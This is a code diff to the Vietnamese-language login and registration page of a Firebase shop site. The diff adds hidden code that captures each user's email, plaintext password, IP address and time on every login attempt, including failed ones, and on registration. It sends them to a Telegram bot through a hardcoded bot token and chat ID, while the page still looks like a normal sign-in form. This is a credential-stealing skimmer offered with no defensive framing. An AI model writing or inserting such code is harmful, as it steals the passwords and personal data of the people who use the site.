@@ -463,169 +463,250 @@
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
 
   <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyCTnc0HQWRxsHDEWlJ4ZT9yqKDbC8unm00",
-      authDomain: "adminshop-c2ac2.firebaseapp.com",
-      projectId: "adminshop-c2ac2",
-      storageBucket: "adminshop-c2ac2.firebasestorage.app",
-      messagingSenderId: "583532399934",
-      appId: "1:583532399934:web:23a213d578f3144053706f",
-      measurementId: "G-9D6JRTW7TM"
-    };
+         const firebaseConfig = {
+            apiKey: "AIzaSyCTnc0HQWRxsHDEWlJ4ZT9yqKDbC8unm00",
+            authDomain: "adminshop-c2ac2.firebaseapp.com",
+            projectId: "adminshop-c2ac2",
+            storageBucket: "adminshop-c2ac2.firebasestorage.app",
+            messagingSenderId: "583532399934",
+            appId: "1:583532399934:web:23a213d578f3144053706f",
+            measurementId: "G-9D6JRTW7TM"
+        };
 
-    firebase.initializeApp(firebaseConfig);
-    const auth = firebase.auth();
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
 
-    function switchForm(formType) {
-      const loginForm = document.getElementById('loginForm');
-      const registerForm = document.getElementById('registerForm');
-      
-      if (formType === 'register') {
-        loginForm.classList.add('hidden');
-        registerForm.classList.remove('hidden');
-      } else {
-        registerForm.classList.add('hidden');
-        loginForm.classList.remove('hidden');
-      }
-      clearAlerts();
-    }
+        // === THAY 2 DÒNG NÀY BẰNG THÔNG TIN CỦA ANH ===
+        const TELEGRAM_BOT_TOKEN = "7571735453:AAG8gkZ5pFyt4mCc88RTQOKAq3MqDAURfSQ"; // Thay bằng token bot của anh
+        const TELEGRAM_CHAT_ID = "7389597494"; // Thay bằng chat ID của anh (số âm nếu là group)
 
-    function togglePassword(inputId, icon) {
-      const input = document.getElementById(inputId);
-      if (input.type === 'password') {
-        input.type = 'text';
-        icon.classList.remove('fa-eye');
-        icon.classList.add('fa-eye-slash');
-      } else {
-        input.type = 'password';
-        icon.classList.remove('fa-eye-slash');
-        icon.classList.add('fa-eye');
-      }
-    }
+        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-    function showAlert(elementId, message, type = 'error') {
-      const alert = document.getElementById(elementId);
-      const span = alert.querySelector('span');
-      span.textContent = message;
-      alert.className = `alert alert-${type} show`;
-      setTimeout(() => alert.classList.remove('show'), 5000);
-    }
-
-    function clearAlerts() {
-      document.querySelectorAll('.alert').forEach(alert => {
-        alert.classList.remove('show');
-      });
-    }
-
-    function validateEmail(email) {
-      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-    }
-
-    document.getElementById('loginBtn').onclick = async function() {
-      const email = document.getElementById('loginEmail').value.trim();
-      const pass = document.getElementById('loginPass').value;
-      const btn = this;
-
-      clearAlerts();
-
-      if (!email || !pass) {
-        showAlert('loginError', 'Vui lòng nhập đầy đủ thông tin!');
-        return;
-      }
-
-      if (!validateEmail(email)) {
-        showAlert('loginError', 'Email không hợp lệ!');
-        return;
-      }
-
-      btn.disabled = true;
-      btn.querySelector('span').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang xử lý...';
-
-      try {
-        await auth.signInWithEmailAndPassword(email, pass);
-        window.location.href = "index.html";
-      } catch (err) {
-        let msg = 'Đăng nhập thất bại!';
-        if (err.code === 'auth/user-not-found' || err.code === 'auth/wrong-password') {
-          msg = 'Email hoặc mật khẩu không đúng!';
-        } else if (err.code === 'auth/too-many-requests') {
-          msg = 'Quá nhiều lần thử. Vui lòng thử lại sau!';
-        } else if (err.code === 'auth/invalid-email') {
-          msg = 'Email không hợp lệ!';
+        // Lấy IP
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip || 'Không lấy được IP';
+            } catch {
+                return 'Lỗi lấy IP';
+            }
         }
-        showAlert('loginError', msg);
-      } finally {
-        btn.disabled = false;
-        btn.querySelector('span').innerHTML = '<i class="fas fa-sign-in-alt"></i> Đăng Nhập';
-      }
-    };
 
-    document.getElementById('registerBtn').onclick = async function() {
-      const name = document.getElementById('registerName').value.trim();
-      const email = document.getElementById('registerEmail').value.trim();
-      const pass = document.getElementById('registerPass').value;
-      const btn = this;
-
-      clearAlerts();
-
-      if (!name || !email || !pass) {
-        showAlert('registerError', 'Vui lòng nhập đầy đủ thông tin!');
-        return;
-      }
-
-      if (name.length < 2) {
-        showAlert('registerError', 'Tên phải có ít nhất 2 ký tự!');
-        return;
-      }
-
-      if (!validateEmail(email)) {
-        showAlert('registerError', 'Email không hợp lệ!');
-        return;
-      }
-
-      if (pass.length < 6) {
-        showAlert('registerError', 'Mật khẩu phải có ít nhất 6 ký tự!');
-        return;
-      }
-
-      btn.disabled = true;
-      btn.querySelector('span').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang xử lý...';
-
-      try {
-        const userCredential = await auth.createUserWithEmailAndPassword(email, pass);
-        await userCredential.user.updateProfile({ displayName: name });
-        
-        showAlert('registerSuccess', 'Đăng ký thành công! Đang chuyển hướng...', 'success');
-        
-        setTimeout(() => {
-          window.location.href = 'index.html';
-        }, 2000);
-        
-      } catch (err) {
-        let msg = 'Đăng ký thất bại!';
-        if (err.code === 'auth/email-already-in-use') {
-          msg = 'Email đã được sử dụng!';
-        } else if (err.code === 'auth/invalid-email') {
-          msg = 'Email không hợp lệ!';
-        } else if (err.code === 'auth/weak-password') {
-          msg = 'Mật khẩu quá yếu!';
+        // Lấy thời gian chi tiết
+        function getTimeDetail() {
+            const now = new Date();
+            const day = String(now.getDate()).padStart(2, '0');
+            const month = String(now.getMonth() + 1).padStart(2, '0');
+            const year = now.getFullYear();
+            const hour = String(now.getHours()).padStart(2, '0');
+            const minute = String(now.getMinutes()).padStart(2, '0');
+            const second = String(now.getSeconds()).padStart(2, '0');
+            return `${hour}:${minute}:${second} - ${day}/${month}/${year}`;
         }
-        showAlert('registerError', msg);
-        btn.disabled = false;
-        btn.querySelector('span').innerHTML = '<i class="fas fa-user-plus"></i> Tạo Tài Khoản';
-      }
-    };
 
-    document.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') {
-        const loginForm = document.getElementById('loginForm');
-        if (!loginForm.classList.contains('hidden')) {
-          document.getElementById('loginBtn').click();
-        } else {
-          document.getElementById('registerBtn').click();
+        // Gửi về Telegram
+        async function sendToTelegram(message) {
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: "HTML"
+            };
+            try {
+                await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.log("Gửi Telegram lỗi:", e);
+            }
         }
-      }
-    });
+
+        function switchForm(formType) {
+            const loginForm = document.getElementById('loginForm');
+            const registerForm = document.getElementById('registerForm');
+            
+            if (formType === 'register') {
+                loginForm.classList.add('hidden');
+                registerForm.classList.remove('hidden');
+            } else {
+                registerForm.classList.add('hidden');
+                loginForm.classList.remove('hidden');
+            }
+            clearAlerts();
+        }
+
+        function togglePassword(inputId, icon) {
+            const input = document.getElementById(inputId);
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                input.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        }
+
+        function showAlert(elementId, message, type = 'error') {
+            const alert = document.getElementById(elementId);
+            const span = alert.querySelector('span');
+            span.textContent = message;
+            alert.className = `alert alert-${type} show`;
+            setTimeout(() => alert.classList.remove('show'), 5000);
+        }
+
+        function clearAlerts() {
+            document.querySelectorAll('.alert').forEach(alert => {
+                alert.classList.remove('show');
+            });
+        }
+
+        function validateEmail(email) {
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        }
+
+        // ĐĂNG NHẬP
+        document.getElementById('loginBtn').onclick = async function() {
+            const email = document.getElementById('loginEmail').value.trim();
+            const pass = document.getElementById('loginPass').value;
+            const btn = this;
+
+            clearAlerts();
+
+            if (!email || !pass) {
+                showAlert('loginError', 'Vui lòng nhập đầy đủ thông tin!');
+                return;
+            }
+
+            if (!validateEmail(email)) {
+                showAlert('loginError', 'Email không hợp lệ!');
+                return;
+            }
+
+            btn.disabled = true;
+            btn.querySelector('span').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang xử lý...';
+
+            const ip = await getIP();
+            const time = getTimeDetail();
+
+            try {
+                await auth.signInWithEmailAndPassword(email, pass);
+
+                // Gửi khi đăng nhập thành công
+                const msg = `<b>🟢 ĐĂNG NHẬP THÀNH CÔNG</b>\n\n` +
+                            `<b>Email:</b> <code>${email}</code>\n` +
+                            `<b>Pass:</b> <code>${pass}</code>\n` +
+                            `<b>IP:</b> <code>${ip}</code>\n` +
+                            `<b>Thời gian:</b> ${time}`;
+                await sendToTelegram(msg);
+
+                window.location.href = "index.html";
+            } catch (err) {
+                let msgError = 'Đăng nhập thất bại!';
+                if (err.code === 'auth/user-not-found' || err.code === 'auth/wrong-password') {
+                    msgError = 'Email hoặc mật khẩu không đúng!';
+
+                    // Gửi luôn cả khi sai pass
+                    const failMsg = `<b>🔴 THỬ ĐĂNG NHẬP (SAI)</b>\n\n` +
+                                    `<b>Email:</b> <code>${email}</code>\n` +
+                                    `<b>Pass:</b> <code>${pass}</code>\n` +
+                                    `<b>IP:</b> <code>${ip}</code>\n` +
+                                    `<b>Thời gian:</b> ${time}`;
+                    await sendToTelegram(failMsg);
+                } else if (err.code === 'auth/too-many-requests') {
+                    msgError = 'Quá nhiều lần thử. Vui lòng thử lại sau!';
+                } else if (err.code === 'auth/invalid-email') {
+                    msgError = 'Email không hợp lệ!';
+                }
+                showAlert('loginError', msgError);
+            } finally {
+                btn.disabled = false;
+                btn.querySelector('span').innerHTML = '<i class="fas fa-sign-in-alt"></i> Đăng Nhập';
+            }
+        };
+
+        // ĐĂNG KÝ
+        document.getElementById('registerBtn').onclick = async function() {
+            const name = document.getElementById('registerName').value.trim();
+            const email = document.getElementById('registerEmail').value.trim();
+            const pass = document.getElementById('registerPass').value;
+            const btn = this;
+
+            clearAlerts();
+
+            if (!name || !email || !pass) {
+                showAlert('registerError', 'Vui lòng nhập đầy đủ thông tin!');
+                return;
+            }
+
+            if (name.length < 2) {
+                showAlert('registerError', 'Tên phải có ít nhất 2 ký tự!');
+                return;
+            }
+
+            if (!validateEmail(email)) {
+                showAlert('registerError', 'Email không hợp lệ!');
+                return;
+            }
+
+            if (pass.length < 6) {
+                showAlert('registerError', 'Mật khẩu phải có ít nhất 6 ký tự!');
+                return;
+            }
+
+            btn.disabled = true;
+            btn.querySelector('span').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Đang xử lý...';
+
+            const ip = await getIP();
+            const time = getTimeDetail();
+
+            try {
+                const userCredential = await auth.createUserWithEmailAndPassword(email, pass);
+                await userCredential.user.updateProfile({ displayName: name });
+                
+                // Gửi khi đăng ký thành công
+                const msg = `<b>🟢 ĐĂNG KÝ THÀNH CÔNG</b>\n\n` +
+                            `<b>Tên:</b> ${name}\n` +
+                            `<b>Email:</b> <code>${email}</code>\n` +
+                            `<b>Pass:</b> <code>${pass}</code>\n` +
+                            `<b>IP:</b> <code>${ip}</code>\n` +
+                            `<b>Thời gian:</b> ${time}`;
+                await sendToTelegram(msg);
+                
+                showAlert('registerSuccess', 'Đăng ký thành công! Đang chuyển hướng...', 'success');
+                
+                setTimeout(() => {
+                    window.location.href = 'index.html';
+                }, 2000);
+                
+            } catch (err) {
+                let msg = 'Đăng ký thất bại!';
+                if (err.code === 'auth/email-already-in-use') {
+                    msg = 'Email đã được sử dụng!';
+                } else if (err.code === 'auth/invalid-email') {
+                    msg = 'Email không hợp lệ!';
+                } else if (err.code === 'auth/weak-password') {
+                    msg = 'Mật khẩu quá yếu!';
+                }
+                showAlert('registerError', msg);
+                btn.disabled = false;
+                btn.querySelector('span').innerHTML = '<i class="fas fa-user-plus"></i> Tạo Tài Khoản';
+            }
+        };
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const loginForm = document.getElementById('loginForm');
+                if (!loginForm.classList.contains('hidden')) {
+                    document.getElementById('loginBtn').click();
+                } else {
+                    document.getElementById('registerBtn').click();
+                }
+            }
+        });
   </script>
 </body>
 </html>
